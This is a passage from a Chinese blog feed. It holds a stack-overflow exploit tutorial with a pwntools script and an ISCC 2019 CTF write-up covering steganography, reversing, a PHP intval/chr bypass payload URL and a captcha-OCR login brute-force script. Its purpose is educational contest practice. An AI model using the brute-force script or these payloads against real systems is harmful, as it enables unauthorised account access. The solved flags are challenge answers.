class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>IDA查看</p><p><img src="/2019/05/17/PWN学习之栈溢出/F:/blog\Hexo\source\_posts\PWN学习之栈溢出\1.JPG" alt=""></p><p>IDA获取success地址</p><p><img src="/2019/05/17/PWN学习之栈溢出/F:/blog\Hexo\source\_posts\PWN学习之栈溢出\2.JPG" alt=""></p><p>攻击脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x08049172</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:"</span></span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:shared/pwn/栈溢出<span class="comment"># python exp.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./stack_example'</span>: pid 8314</span><br><span class="line">addr:</span><br><span class="line">r\x91\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">'./stack_example'</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 8314)</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbbr\x91\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2019解题记录</title>
    <link href="https://j-kangel.github.io/2019/05/05/ISCC2019%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://j-kangel.github.io/2019/05/05/ISCC2019解题记录/</id>
    <published>2019-05-05T15:45:10.000Z</published>
    <updated>2019-05-08T01:21:57.758Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：这是一个被混淆的文件，但是我忘记了这个文件的密码。你能够帮助我还原明文吗？</span><br></pre></td></tr></table></figure><p>很明显的八进制，先转成字符串，发现是base64编码，解码即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"message.txt"</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">txt = f.read().split(<span class="string">" "</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#print txt</span></span><br><span class="line">s = <span class="string">""</span>   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line"><span class="keyword">if</span> i:</span><br><span class="line">    s += chr(int(i,<span class="number">8</span>))</span><br><span class="line">flag = base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:ISCC{N0_0ne_can_st0p_y0u}</p><p>知识点：八进制、base64</p><h4 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：房屋为什么会倒立！是重力反转了吗？</span><br></pre></td></tr></table></figure><p>用stegsolve打开，DataExtract分析,发现IsCc_2019，直接提交不对，根据提示倒过来就对了</p><p><img src="/2019/05/05/ISCC2019解题记录/1.JPG" alt=""></p><p>Save Bin，将前9个字节进行逆序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">"2"</span></span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">s = f.read()</span><br><span class="line"></span><br><span class="line">s = s[:<span class="number">9</span>]</span><br><span class="line">flag = s[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag：9102_cCsI</p><p>知识点：LSB隐写</p><h4 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：Trying to figure out Keyes&apos; secret</span><br></pre></td></tr></table></figure><p>打开文件发现都是大写英文字母，有点像键盘密码，于是进行替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RFVGYHN -&gt; h</span><br><span class="line">WSXCDE -&gt; e</span><br><span class="line">WSXCV -&gt; l</span><br><span class="line">TGBNMJUY - o</span><br></pre></td></tr></table></figure><p>得到hello，说明想法是对的，最后得到一段话，flag要转为大写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello,in computer security, capture the flag (ctf), a type of cryptosport, is a computer security competition. ctf contests are usually desluned to serve as an educational exercise to give participants experience in securing a machine, as well as conducting and reacting to the sort of attacks found in the real world (i.e., bug bounty programs in professional settings). here are your FLAG&#123;ISCC KEYBOARD CIPHER&#125; reverse-engineering, network sniffing, protocol analysis, system administration, programming, and cryptanalysis are all skills which have been required by prior ctf contests at def con.</span><br></pre></td></tr></table></figure><p>flag：FLAG{ISCC KEYBOARD CIPHER}</p><p>知识点：键盘密码</p><h4 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：Aesop&apos;s chest and key lie within. To find it.</span><br></pre></td></tr></table></figure><p>打开是一张GIF，分解后发现ISCC字样</p><p><img src="/2019/05/05/ISCC2019解题记录/2.JPG" alt=""></p><p>用HxD查看GIF，在文件尾部发现base64编码字符串。先用base64解密发现<code>Salted__</code>，根据提示Aesop猜测与AES加密有关，关键词搜索发现这是crypto-js中AES加密（<a href="https://stackoverflow.com/questions/36762098/how-to-decrypt-password-from-javascript-cryptojs-aes-encryptpassword-passphras），借用网上的脚本，双重解密后得到flag" target="_blank" rel="noopener">https://stackoverflow.com/questions/36762098/how-to-decrypt-password-from-javascript-cryptojs-aes-encryptpassword-passphras），借用网上的脚本，双重解密后得到flag</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(data)</span>:</span></span><br><span class="line">    length = <span class="number">16</span> - (len(data) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> data + (chr(length)*length).encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> data[:-(data[<span class="number">-1</span>] <span class="keyword">if</span> type(data[<span class="number">-1</span>]) == int <span class="keyword">else</span> ord(data[<span class="number">-1</span>]))]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_key</span><span class="params">(data, salt, output=<span class="number">48</span>)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(salt) == <span class="number">8</span>, len(salt)</span><br><span class="line">    data += salt</span><br><span class="line">    key = md5(data).digest()</span><br><span class="line">    final_key = key</span><br><span class="line">    <span class="keyword">while</span> len(final_key) &lt; output:</span><br><span class="line">        key = md5(key + data).digest()</span><br><span class="line">        final_key += key</span><br><span class="line">    <span class="keyword">return</span> final_key[:output]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">    salt = Random.new().read(<span class="number">8</span>)</span><br><span class="line">    key_iv = bytes_to_key(passphrase, salt, <span class="number">32</span>+<span class="number">16</span>)</span><br><span class="line">    key = key_iv[:<span class="number">32</span>]</span><br><span class="line">    iv = key_iv[<span class="number">32</span>:]</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">b"Salted__"</span> + salt + aes.encrypt(pad(message)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">    encrypted = base64.b64decode(encrypted)</span><br><span class="line">    <span class="keyword">assert</span> encrypted[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">b"Salted__"</span></span><br><span class="line">    salt = encrypted[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">    key_iv = bytes_to_key(passphrase, salt, <span class="number">32</span>+<span class="number">16</span>)</span><br><span class="line">    key = key_iv[:<span class="number">32</span>]</span><br><span class="line">    iv = key_iv[<span class="number">32</span>:]</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> unpad(aes.decrypt(encrypted[<span class="number">16</span>:]))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"ISCC"</span></span><br><span class="line"><span class="comment">#print len(key)</span></span><br><span class="line">c = <span class="string">"U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw=="</span></span><br><span class="line">m = decrypt(c,key)</span><br><span class="line">m = decrypt(m,key)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><p>flag：flag{DugUpADiamondADeepDarkMine}</p><p>知识点：GIF图片，AES</p><h4 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：“想要我的宝藏吗？如果想要的话，那就到碎纸机中找吧，我全部都放在那里。”</span><br></pre></td></tr></table></figure><p>用HxD查看图片，文件末尾发现还包含压缩包以及其他文件。于是binwalk一下，得到如下内容</p><p><img src="/2019/05/05/ISCC2019解题记录/12.JPG" alt=""></p><p>readme.txt内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">碎纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？</span><br><span class="line">我去问了欧鹏・曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。</span><br></pre></td></tr></table></figure><p>好像并没有什么直接的信息，继续用HxD查看每一张图片</p><p><img src="/2019/05/05/ISCC2019解题记录/13.JPG" alt=""></p><p>发现有0x4E2=1250字节的可以数据，且大部分都是00或ff，联想到RGB，（255,255,255）表示白色，（0,0,0）表示黑色，最后应该得到黑色背景的白色flag。于是提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">25</span></span><br><span class="line">y = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">"1.jpg"</span></span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">jpg = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(ord(jpg[<span class="number">0</span>]))</span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))</span><br><span class="line"><span class="comment">#index = 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">rgb = ord(jpg[j*<span class="number">25</span> + i])</span><br><span class="line">im.putpixel((i,j),(rgb,rgb,rgb))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">"flag1.jpg"</span>)</span><br></pre></td></tr></table></figure><p>提取前两个，发现</p><p><img src="/2019/05/05/ISCC2019解题记录/flag1.jpg" alt=""><img src="/2019/05/05/ISCC2019解题记录/flag2.jpg" alt=""></p><p>然后全部提取出来，得到</p><p>flag：Flag={ISCC_is_interesting_!}</p><p>知识点：图片隐写，RGB通道</p><h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="answer-to-everything"><a href="#answer-to-everything" class="headerlink" title="answer to everything"></a>answer to everything</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tip：sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。</span><br><span class="line">注意：将得到的flag变为ISCC&#123;flag&#125;形式提交。</span><br></pre></td></tr></table></figure><p>给的文件是.exe，用DIE查看发现是ELF64。用ida打开</p><p><img src="/2019/05/05/ISCC2019解题记录/4.png" alt=""></p><p>输入42，得到kdudpeh，根据提示，sha1之后加上格式即为flag</p><p><img src="/2019/05/05/ISCC2019解题记录/5.JPG" alt=""></p><p>flag:ISCC{80ee2a3fe31da904c596d993f7f1de4827c1450a}</p><p>知识点：ida使用</p><h4 id="Rev01"><a href="#Rev01" class="headerlink" title="Rev01"></a>Rev01</h4><p>这是一道rust程序的逆向，INS hack teaser 2019有一道类似的题（<a href="https://www.anquanke.com/post/id/169970）" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169970）</a></p><p>跟着上面的思路，找到程序入口</p><p><img src="/2019/05/05/ISCC2019解题记录/6.JPG" alt=""></p><p>进去后找到关键代码</p><p><img src="/2019/05/05/ISCC2019解题记录/7.JPG" alt=""></p><p>程序大致意思是：程序经过一系列运算的到一串字符v34，然后将该字符移位异或操作之后与输入的值进行比较。</p><p>因此只要找到程序生成的字符串就可以了，具体算法很复杂，于是用gdb动态调试，在do-while循环结束的地方下断点，然后查看v34的类容。</p><p>具体调试过程如下</p><p>gdb载入文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b main</span><br><span class="line">Breakpoint 5 at 0x55555555ab10</span><br><span class="line">gdb-peda$ run</span><br></pre></td></tr></table></figure><p>找到程序入口</p><p><img src="/2019/05/05/ISCC2019解题记录/9.JPG" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b _ZN15beginer_reverse4main17h80fa15281f646bc1E</span><br><span class="line">Breakpoint 6 at 0x55555555a6a0</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure><p>在ida中找到do-while循环结束的地方</p><p><img src="/2019/05/05/ISCC2019解题记录/8.JPG" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b *0x000055555555a9a8</span><br><span class="line">Breakpoint 7 at 0x55555555a9a8</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">abc123456  <span class="comment">##输入的类容</span></span><br></pre></td></tr></table></figure><p><img src="/2019/05/05/ISCC2019解题记录/10.JPG" alt=""></p><p>r14是输入的类容，r15即我们需要的类容，dump下来解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"0x000001540x000001800x000001fc0x000001e4 0x000001f80x000001540x000001900x000001bc 0x000001bc0x000001b80x000001540x000001f8 0x000001940x000001540x000001b40x000001bc 0x000001f80x000001540x000001f40x00000188 0x000001ac0x000001f80x000001540x0000018c 0x000001e40x000001540x000001900x000001bc 0x000001bc0x000001b80x000001bc0x000001b8 0x000001540x00000090"</span></span><br><span class="line">s = s.replace(<span class="string">"\t"</span>,<span class="string">" "</span>).split(<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag += (chr((int(i,<span class="number">16</span>)&gt;&gt;<span class="number">2</span>) ^ <span class="number">0xa</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag：_just_need_to_get_what_is_needed_.</p><p>知识点：rust程序逆向、gdb动态调试</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>大致意思：get value数组和password，value的值要为’w3lc0me_To_ISCC2019’</p><p>问题在chr和intval两个函数，value[i]不能为[32,127],chr()函数对大于256的值会首先模256，即chr(256+ord(‘A’)) = ‘A’,PHP 5.x中intval()无法处理十六进制，所以只要password&gt;=0x91d即可，所以构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"w3lc0me_To_ISCC2019"</span></span><br><span class="line">payload = <span class="string">"password = 0x91d"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">a = <span class="number">256</span> + ord(i)</span><br><span class="line">a = <span class="string">"&amp;value[]="</span> + str(a)</span><br><span class="line">payload += a</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://39.100.83.188:8001/?password=0x91d&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313</span></span><br></pre></td></tr></table></figure><p>flag：flag{8311873e241ccad54463eaa5d4efc1e9}</p><p>知识点：PHP中的chr和intval函数</p><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><img src="/2019/05/05/ISCC2019解题记录/11.JPG" alt=""></p><p>带验证码的密码爆破，验证码就是为了防止爆破的，但是这里的验证码可以用文字识别。调用百度的api,脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">APP_ID = <span class="string">'your API_ID'</span></span><br><span class="line">API_KEY = <span class="string">'your API_KEY'</span></span><br><span class="line">SECRET_KEY = <span class="string">'your SECRET_KEY'</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line"><span class="string">""" 读取图片 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvcode</span><span class="params">(session)</span>:</span></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8002/vcode.php"</span></span><br><span class="line">vcode = session.get(url)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"1.png"</span>,<span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(vcode.content)</span><br><span class="line"></span><br><span class="line">image = get_file_content(<span class="string">'1.png'</span>)</span><br><span class="line">a = client.basicGeneral(image);</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a = a[<span class="string">"words_result"</span>][<span class="number">0</span>][<span class="string">"words"</span>]</span><br><span class="line"><span class="keyword">if</span> len(a) == <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">return</span> getvcode(session)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> getvcode(session)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteForce</span><span class="params">(session,passwd)</span>:</span></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8002/login.php"</span></span><br><span class="line">data = &#123;&#125;</span><br><span class="line">data[<span class="string">"username"</span>] = <span class="string">"admin"</span></span><br><span class="line">data[<span class="string">"pwd"</span>] = str(passwd)</span><br><span class="line">data[<span class="string">"user_code"</span>] = getvcode(session)</span><br><span class="line">data[<span class="string">"Login"</span>] = <span class="string">"submit"</span></span><br><span class="line"><span class="comment">#print data</span></span><br><span class="line">res = session.post(url,data = data)</span><br><span class="line"><span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">result = bruteForce(sess,i)</span><br><span class="line"><span class="keyword">while</span>(<span class="string">"验证码"</span> <span class="keyword">in</span> result):</span><br><span class="line">result = bruteForce(sess,i)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%d:"</span>%i ,result</span><br></pre></td></tr></table></figure><p>flag：flag{996_ICU}</p><p>知识点：文字识别，密码爆破</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Pwn01"><a href="#Pwn01" class="headerlink" title="Pwn01"></a>Pwn01</h4><p>ida打开，发现存在缓冲区溢出</p><p><img src="/2019/05/05/ISCC2019解题记录/14.JPG" alt=""></p><p>checksec，发现开启了NX保护，不会绕过，卒！</p>]]></content>
    
    <summary type="html">
    
      
      
